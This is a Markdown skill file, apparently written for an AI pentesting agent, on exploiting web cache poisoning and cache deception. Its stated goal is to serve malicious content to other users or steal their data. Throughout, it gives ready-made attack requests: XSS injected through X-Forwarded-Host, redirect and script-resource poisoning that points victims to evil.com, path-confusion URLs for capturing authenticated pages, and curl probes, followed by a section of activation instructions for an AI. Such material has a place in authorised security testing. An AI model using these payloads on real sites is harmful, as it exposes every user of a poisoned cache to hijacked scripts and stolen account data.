# Web Cache Poisoning/Deception Skill

## Goal

Exploit web cache vulnerabilities to serve malicious content to other users or steal sensitive data.

## Methodology

1. **Identify Caching:** Detect caching headers and behaviors
2. **Find Unkeyed Inputs:** Discover inputs that affect response but aren't in cache key
3. **Poison Cache:** Inject malicious content via unkeyed inputs
4. **Verify Persistence:** Confirm cached response serves to others
5. **Exploit:** XSS, credential theft, or path confusion

## Cache Headers Analysis

```http
# Caching indicators
Cache-Control: max-age=3600, public
Age: 120
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Via: 1.1 varnish (Varnish/6.0)
```

## Finding Unkeyed Inputs

```http
# Test which headers affect response but not cache key
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com

# Param miner (Burp extension) automates this
```

## Cache Poisoning Attacks

### XSS via X-Forwarded-Host
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(1)</script>

# Response cached with XSS payload
<link href="//"><script>alert(1)</script>/style.css">
```

### Redirect Poisoning
```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Cached redirect to evil.com
Location: https://evil.com/login
```

### Resource Poisoning
```http
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Static file now loads from evil.com
# Inject malicious JavaScript
```

## Cache Deception

```bash
# Trick cache into storing sensitive response

# Victim visits (authenticated):
https://target.com/account/profile.css

# If backend ignores .css extension:
- Serves /account/profile content
- Cache stores it as static .css file
- Attacker accesses same URL, gets victim's data
```

### Path Confusion Payloads
```bash
/account/settings/x.css
/account/settings/.css
/account/settings/..%2f.css
/account/settings%2f.css
/api/user%3f.js
```

## Cache Key Normalization

```bash
# Headers that may be normalized differently
GET /page HTTP/1.1
Host: target.com
# vs
GET /PAGE HTTP/1.1
Host: TARGET.COM

# URL encoding variations
/page?x=1
/page?x=%31
```

## Fat GET Attacks

```http
# GET request with body (cached by key, but body processed)
GET /api/data HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 23

{"user": "admin"}
```

## Tools

* **Burp Param Miner** - Finding unkeyed inputs
* **Web-Cache-Vulnerability-Scanner** - Automated testing
* **curl** - Manual header testing

## Example Commands

```bash
# Test for cache poisoning
curl -H "X-Forwarded-Host: evil.com" https://target.com/page -v

# Repeated requests to check caching
for i in {1..5}; do curl -sI https://target.com/page | grep -i cache; done
```

## Guidance for AI

* Activate when testing CDN-fronted or cached applications
* Check Age and X-Cache headers to identify caching
* Use Param Miner to find unkeyed headers
* Cache deception targets authenticated responses
* Test path normalization differences between cache and origin
* Static file extensions (.css, .js, .jpg) often trigger caching
* Cache poisoning affects all users; test carefully
